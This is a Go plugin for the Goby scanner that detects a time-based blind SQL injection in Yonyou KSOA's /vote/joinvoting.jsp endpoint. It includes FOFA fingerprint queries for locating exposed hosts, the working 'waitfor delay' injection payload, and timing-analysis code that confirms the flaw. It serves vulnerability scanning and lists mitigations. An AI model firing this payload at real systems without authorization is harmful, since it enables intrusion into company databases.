package exploits

import (
	"math"
	"math/rand"
	"strconv"
	"time"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
  "Name": "用友时空KSOA /vote/joinvoting.jsp SQL 注入漏洞",
  "Description": "<p>用友时空KSOA是用友网络科技股份有限公司推出的协同办公与企业管理平台，面向企业组织提供知识管理、流程协作、投票调查、论坛交流、通讯录等办公自动化能力，帮助企业实现信息共享和业务协同。用友时空KSOA /vote/joinvoting.jsp 接口存在SQL注入漏洞，攻击者可获取数据库敏感信息。<br></p>",
  "Product": "用友时空KSOA",
  "Homepage": "https://www.yonyou.com/",
  "DisclosureDate": "2026-07-14",
  "PostTime": "2026-07-14",
  "Author": "heqiming@baimaohui.net",
  "FofaQuery": "body=\"onmouseout=\\\"this.classname='btn btnOff'\\\"\" || body=\"productKSOA.jpg\" || (body=\"check.jsp?pid=\" && body=\"jsp\")",
  "GobyQuery": "body=\"onmouseout=\\\"this.classname='btn btnOff'\\\"\" || body=\"productKSOA.jpg\" || (body=\"check.jsp?pid=\" && body=\"jsp\")",
  "Level": "2",
  "Impact": "<p>攻击者可利用该漏洞执行恶意SQL语句，获取数据库中的敏感信息，造成数据泄露。<br></p>",
  "Recommendation": "<p>建议厂商尽快修复该漏洞，临时缓解措施包括：限制相关接口访问来源，对用户输入进行严格校验和过滤，使用参数化查询或预编译语句，并部署Web应用防火墙进行防护。<br></p>",
  "References": [],
  "Is0day": false,
  "HasExp": false,
  "ExpParams": [],
  "ExpTips": {
    "Type": "",
    "Content": ""
  },
  "ScanSteps": [
    "AND",
    {
      "Request": {
        "method": "GET",
        "uri": "/vote/joinvoting.jsp?Vote_id=%27;waitfor+delay+%270:0:0%27--+&isModel=&isClose=",
        "follow_redirect": false,
        "header": {},
        "data_type": "text",
        "data": ""
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    }
  ],
  "ExploitSteps": [
    "AND",
    {
      "Request": {
        "method": "GET",
        "uri": "/vote/joinvoting.jsp?Vote_id=%27;waitfor+delay+%270:0:0%27--+&isModel=&isClose=",
        "follow_redirect": false,
        "header": {},
        "data_type": "text",
        "data": ""
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "id": 0,
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    }
  ],
  "Tags": [
    "SQL注入",
    "盲注"
  ],
  "VulType": [
    "SQL注入"
  ],
  "CVEIDs": [
    ""
  ],
  "CNNVD": [
    ""
  ],
  "CNVD": [
    ""
  ],
  "CVSSScore": "7.5",
  "Translation": {
    "CN": {
      "Name": "用友时空KSOA /vote/joinvoting.jsp SQL 注入漏洞",
      "Product": "用友时空KSOA",
      "Description": "<p>用友时空KSOA是用友网络科技股份有限公司推出的协同办公与企业管理平台，面向企业组织提供知识管理、流程协作、投票调查、论坛交流、通讯录等办公自动化能力，帮助企业实现信息共享和业务协同。用友时空KSOA /vote/joinvoting.jsp 接口存在SQL注入漏洞，攻击者可获取数据库敏感信息。<br></p>",
      "Recommendation": "<p>建议厂商尽快修复该漏洞，临时缓解措施包括：限制相关接口访问来源，对用户输入进行严格校验和过滤，使用参数化查询或预编译语句，并部署Web应用防火墙进行防护。<br></p>",
      "Impact": "<p>攻击者可利用该漏洞执行恶意SQL语句，获取数据库中的敏感信息，造成数据泄露。<br></p>",
      "VulType": [
        "SQL注入"
      ],
      "Tags": [
        "SQL注入",
        "盲注"
      ]
    },
    "EN": {
      "Name": "Yonyou KSOA /vote/joinvoting.jsp SQL Injection Vulnerability",
      "Product": "Yonyou-KSOA",
      "Description": "<p>Yonyou KSOA is a collaborative office and enterprise management platform developed by Yonyou Network Technology Co., Ltd. It provides knowledge management, workflow collaboration, voting, forum communication, address book and other office automation capabilities for enterprise organizations. The /vote/joinvoting.jsp interface in Yonyou KSOA has a SQL injection vulnerability that may allow attackers to obtain sensitive database information.<br></p>",
      "Recommendation": "<p>Users are advised to apply vendor patches as soon as possible. Temporary mitigations include restricting access to the affected interface, strictly validating and filtering user input, using parameterized queries or prepared statements, and deploying a web application firewall.<br></p>",
      "Impact": "<p>Attackers can exploit this vulnerability to execute malicious SQL statements and obtain sensitive information from the database, resulting in data leakage.<br></p>",
      "VulType": [
        "SQL Injection"
      ],
      "Tags": [
        "SQL Injection",
        "Blind SQL Injection"
      ]
    }
  },
  "AttackSurfaces": {
    "Application": null,
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": null
  },
  "Variables": {},
  "VariablesOrder": [],
  "EditType": "fast"
}`

	sendPayload_d3Nr86 := func(hostInfo *httpclient.FixUrl, sleep int) (*httpclient.HttpResponse, error) {
		cfg := httpclient.NewGetRequestConfig("/vote/joinvoting.jsp?Vote_id=%27;waitfor+delay+%270:0:" + strconv.Itoa(sleep) + "%27--+&isModel=&isClose=")
		cfg.Timeout = 15
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		cfg.Header.Store("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
		return jsonvul.DoHttpRequestWithBaseDir(hostInfo, cfg)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			calculateAverage := func(data []float64) float64 {
				if len(data) == 0 { return 0 }
				var sum float64
				for _, value := range data { sum += value }
				return sum / float64(len(data))
			}
			calculateStandardDeviation := func(values []float64) float64 {
				if len(values) < 2 { return 0 }
				avg := calculateAverage(values)
				var squaredDiffSum float64
				for _, value := range values {
					diff := value - avg
					squaredDiffSum += math.Pow(diff, 2)
				}
				return math.Sqrt(squaredDiffSum / float64(len(values)))
			}
			doRequest := func(sleep int) (float64, *httpclient.HttpResponse, error) {
				startTime := time.Now()
				resp, err := sendPayload_d3Nr86(hostInfo, sleep)
				if err != nil || resp == nil { return -1, resp, err }
				if resp.StatusCode >= 500 { return -1, resp, nil }
				return time.Now().Sub(startTime).Seconds(), resp, nil
			}
			runningTimes := make([]float64, 6)
			for i := 0; i < 6; i++ {
				runningTime, _, err := doRequest(0)
				if err != nil || runningTime < 0 { return false }
				runningTimes[i] = runningTime
			}
			average := calculateAverage(runningTimes)
			deviation := calculateStandardDeviation(runningTimes)
			threshold := math.Max(float64(2), average+7*deviation)
			matched := 0
			var lastResp *httpclient.HttpResponse
			for i := 0; i < 3; i++ {
				sleepTime := rand.Intn(3) + 3
				runningTime, resp, err := doRequest(sleepTime)
				if err != nil || runningTime < float64(sleepTime) || runningTime < threshold { return false }
				matched++
				lastResp = resp
			}
			if matched == 3 && lastResp != nil && lastResp.Request != nil {
				ss.VulURL = hostInfo.FixedHostInfo + lastResp.Request.URL.Path
				return true
			}
			return false
		},
		nil,
	))
}
